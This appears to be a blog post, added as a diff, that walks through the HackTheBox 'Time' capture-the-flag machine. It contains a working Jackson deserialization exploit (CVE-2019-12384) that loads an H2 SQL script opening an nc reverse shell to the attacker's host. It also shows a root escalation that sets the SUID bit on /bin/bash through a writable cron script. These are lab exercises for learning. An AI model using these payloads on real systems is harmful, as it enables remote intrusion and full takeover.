@@ -1,0 +1,93 @@
+---
+layout: post
+title:  "HackTheBox - Time"
+date:   2021-07-30 17:06:25
+categories: CTF writeups
+---
+
+# ENUMERATION
+
+```
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 0f:7d:97:82:5f:04:2b:e0:0a:56:32:5d:14:56:82:d4 (RSA)
+|   256 24:ea:53:49:d8:cb:9b:fc:d6:c4:26:ef:dd:34:c1:1e (ECDSA)
+|_  256 fe:25:34:e4:3e:df:9f:ed:62:2a:a4:93:52:cc:cd:27 (ED25519)
+80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+|_http-favicon: Unknown favicon MD5: 7D4140C76BF7648531683BFA4F7F8C22
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+|_http-title: Online JSON parser
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+```
+Trying to validate anything on the webpage shows us this error:
+
+```js
+Validation failed: Unhandled Java exception: com.fasterxml.jackson.core.JsonParseException: Unrecognized token 'flf': was expecting 'null', 'true', 'false' or NaN
+```
+Sending a json object (eg: {"user":"admin"}) gives this error:
+
+```js
+Validation failed: Unhandled Java exception: com.fasterxml.jackson.databind.exc.MismatchedInputException: Unexpected token (START_OBJECT), expected START_ARRAY: need JSON Array to contain As.WRAPPER_ARRAY type information for class java.lang.Object
+```
+
+# FOOTHOLD
+
+[javascript deserialization CVE](https://github.com/jas502n/CVE-2019-12384/blob/master/CVE-2019-12384.sh)
+
+Write this script:
+
+```s
+┌──(kali㉿MaskdMafia)-[~/Downloads]
+└─$ cat inject.sql 
+
+CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOException {
+        String[] command = {"bash", "-c", cmd};
+        java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(command).getInputStream()).useDelimiter("\\A");
+        return s.hasNext() ? s.next() : "";  }
+$$;
+CALL SHELLEXEC('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.8 4242 >/tmp/f')         
+```
+And then we put the following to validate while simultameously listening in terminal via netcat:
+
+```s
+
+    "ch.qos.logback.core.db.DriverManagerConnectionSource",
+    {
+        "url": "jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http:\/\/10.10.14.8:3000\/inject.sql'"
+    }
+]
+```
+And we get the reverse shell. Time to stabilize the shell then :)
+
+We get the user flag in /home/pericles. Now its time for root.
+
+# PRIVILEGE ESCALATION
+
+Using pspy64s binary we see a suspicious script /usr/bin/timer_backup.sh , run by root and we have write access!
+
+So I just add this command to the bottom of the script:
+
+```s
+echo "chmod +s /bin/bash" >> timer_backup.sh
+```
+So here's the full script:
+
+```s
+#!/bin/bash
+zip -r website.bak.zip /var/www/html && mv website.bak.zip /root/backup.zip
+chmod +s /bin/bash
+```
+After this we wait a bit and execute the following to get the root flag:
+
+```s
+pericles@time:/usr/bin$ bash -p
+bash-5.0# whoami
+root
+bash-5.0# cd /root
+bash-5.0# ls
+backup.zip  root.txt  snap  timer_backup.sh
+bash-5.0# cat root.txt
+```
